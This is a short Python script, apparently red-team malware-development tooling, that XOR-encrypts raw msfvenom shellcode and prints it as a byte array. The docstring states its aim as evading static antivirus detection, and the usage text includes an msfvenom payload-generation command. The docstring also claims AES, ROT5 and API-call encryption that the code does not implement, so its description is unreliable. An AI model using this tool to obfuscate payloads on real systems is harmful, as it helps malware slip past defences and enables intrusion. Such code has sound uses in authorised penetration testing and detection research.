import sys
import os
import hashlib
from Crypto.Cipher import AES

"""
Author: Toby Jackson

Takes in raw shellcode generated by msfvenom in the -f raw format and
encrypts it with AES, XOR, and ROT5. Prints shellcode in C format with corresponding keys.

Also has the option to output various WIN32 API calls such as VirtualAlloc, RtlMoveMemory, CreateThread
in encrypted format to evade static detection.

References:
https://www.delftstack.com/howto/python/python-aes-encryption/
https://www.geeksforgeeks.org/xor-cipher/
https://www.geeksforgeeks.org/caesar-cipher-in-cryptography/
https://institute.sektor7.net/red-team-operator-malware-development-essentials
"""

class XOREncryption():
	def __init__(self, plaintext, key):
		self.plaintext		= plaintext
		self.key			= key
		self.lenPlaintext	= len(plaintext)

	def encryption(self):
		ciphertext = []
		print(f"XOR KEY: {self.key}")
		for i in range(self.lenPlaintext):
			enc = self.plaintext[i] ^ ord(self.key[i % len(self.key)])
			ciphertext.append(enc)
		encrypted = XOREncryption.outputCtxKey(self, ciphertext)
		return encrypted

	def outputCtxKey(self, ciphertext):
		x = (f'byte[] encBytes = new byte[] {{ 0x' + ', 0x'.join(hex((x))[2:] for x in ciphertext) + ' };')
		ctx = x.replace("\0", "")
		return ctx

class FileFunctions:
	def __init__(self, file):
		self.inputFile = file

	def getPlaintext(self):
		try: 
			p = open(self.inputFile, "rb")
			p = p.read()
			return p
		except:
			print("[!] Could not open raw shellcode file!")
			sys.exit(2)

def main():
	if len(sys.argv) != 3:
		print("[!] Usage Error: Please specify a key and shellcode file!")
		print("[?] Generate shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin")
		print("[*] Example: python3 encryption.py flareon shellcode.bin")
		sys.exit()

	key = sys.argv[1]
	file = sys.argv[2]

	f = FileFunctions(file)
	plaintext = f.getPlaintext()

	e = XOREncryption(plaintext, key)
	enc = e.encryption()
	print(enc)

if __name__ in "__main__":
	main()
